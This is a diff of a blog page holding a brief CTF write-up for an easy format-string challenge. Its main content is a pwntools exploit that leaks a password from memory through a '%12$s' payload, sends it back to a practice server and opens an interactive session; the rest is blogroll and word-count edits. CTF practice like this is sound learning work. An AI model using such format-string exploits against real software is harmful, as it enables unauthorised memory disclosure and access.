@@ -214,7 +214,7 @@
           <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
         </li>
         <li class="links-of-blogroll-item">
-          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+          <a href="https://ugi57.github.io/" title="https:&#x2F;&#x2F;ugi57.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
@@ -331,7 +331,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>421</span>
+      <span>321</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -354,27 +354,28 @@
 <p>白给题，格式化字符串漏洞</p>
 <p><img src="/images/eb2e947b/1.png" alt="upload successful"></p>
 <p>exp:</p>
-<pre><code class="python=">from pwn import *
+<pre><code class="language-python=">from pwn import *
 
-context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]
+context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
 
 addr = 0x0804C044
 
-pay = &apos;%12$saaa&apos; + p32(addr)
-#p = process(&apos;./pwn&apos;)
-p = remote(&apos;node3.buuoj.cn&apos;, 26394)
-p.sendafter(&apos;:&apos;, pay)
+pay = '%12$saaa' + p32(addr)
+#p = process('./pwn')
+p = remote('node3.buuoj.cn', 26394)
+p.sendafter(':', pay)
 
-p.recvuntil(&apos;,&apos;)
+p.recvuntil(',')
 
 passwd = u32(p.recv(4))
 print hex(passwd)
 
 #gdb.attach(p)
 
-p.send(str(passwd)+&apos;\x00&apos;)
+p.send(str(passwd)+'\x00')
 
-p.interactive()</code></pre>
+p.interactive()
+</code></pre>
 
     </div>
 
@@ -466,13 +467,13 @@ p.interactive()</code></pre>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">380k</span>
+    <span title="站点总字数">379k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:46</span>
+    <span title="站点阅读时长">5:45</span>
   </span>
 </div>
 <div class="busuanzi-count">
